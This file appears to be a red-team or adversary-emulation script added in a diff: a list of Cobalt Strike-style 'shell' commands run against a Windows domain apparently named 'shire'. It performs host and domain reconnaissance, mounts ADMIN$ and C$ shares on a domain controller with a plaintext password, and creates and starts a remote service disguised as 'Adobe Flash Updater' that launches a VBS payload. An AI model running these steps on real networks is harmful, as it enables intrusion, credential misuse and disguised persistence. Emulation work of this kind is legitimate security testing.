@@ -1,0 +1,64 @@
+shell route print
+
+
+shell ipconfig /all
+
+
+shell whoami /all /fo list
+
+
+shell qprocess *
+
+
+shell net start
+
+
+shell net group "Domain Admins" /domain
+
+
+shell net localgroup "Administrators"
+
+
+shell net user
+
+
+shell net user /domain
+
+
+shell net group "Domain Computers" /domain
+
+
+shell net use
+
+
+shell netstat -ano
+
+
+shell reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+
+
+shell net use `\`\HFDC01\ADMIN$ /user:shire\pgustavo W1n1!19
+
+
+shell net use `\`\HFDC01\ADMIN$ /user:shire\pgustavo W1n1!19
+
+
+shell net use /delete `\`\HFDC01\ADMIN$
+
+
+shell net use `\`\HFDC01\C$ password /user:shire\pgustavo
+
+
+shell net use `\`\HFDC01\C$ password /user:shire\pgustavo
+
+
+shell c:\windows\system32\sc.exe \\HFDC01 query
+
+
+shell C:\WINDOWS\system32\sc.exe `\`\HFDC01 create AdobeUpdater binPath= "cmd.exe /c `\`"C:\Users\pgustavo\AppData\Roaming\Adobe\Flash Player\autoupdate.vbs`\`" " DisplayName= "Adobe Flash Updater" start= auto
+
+
+shell c:\windows\system32\sc.exe `\`\HFDC01 qc AdobeUpdater
+
+
+shell c:\windows\system32\sc.exe `\`\HFDC01 start AdobeUpdater
